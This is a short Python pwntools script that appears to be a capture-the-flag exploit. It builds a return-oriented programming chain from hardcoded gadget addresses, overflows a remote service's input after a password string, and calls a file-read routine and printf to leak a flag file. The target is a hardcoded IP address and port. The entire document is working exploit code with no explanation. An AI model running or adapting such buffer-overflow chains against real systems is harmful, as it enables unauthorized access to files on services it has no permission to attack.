#!/usr/bin/env python
from pwn import p64, remote

rop = b''
rop += p64(0x4010f3)  # pop rdi; ret;
rop += p64(0x401338)  # path to flag
rop += p64(0x4010f1)  # pop rsi; pop r15; ret;
rop += p64(0x0)
rop += p64(0xdeadbeefdeadbee0)
rop += p64(0x400e2a)  # read flag
rop += p64(0xdeadbeefdeadbee1)
rop += p64(0xdeadbeefdeadbee2)
rop += p64(0xdeadbeefdeadbee3)
rop += p64(0x4010f3)  # pop rdi; ret;
rop += p64(0x40111b)  # "%s"
rop += p64(0x400ec5)  # printf

target = remote('52.49.91.111', 32666)
print(target.readline().decode('ascii'), end='')
print(target.read(2).decode('ascii'))
target.send(b'they_see_me_rollin_they_hatin\x00' + b'A'*58 + rop + b'\n')
print(target.readall().decode('ascii'), end='')
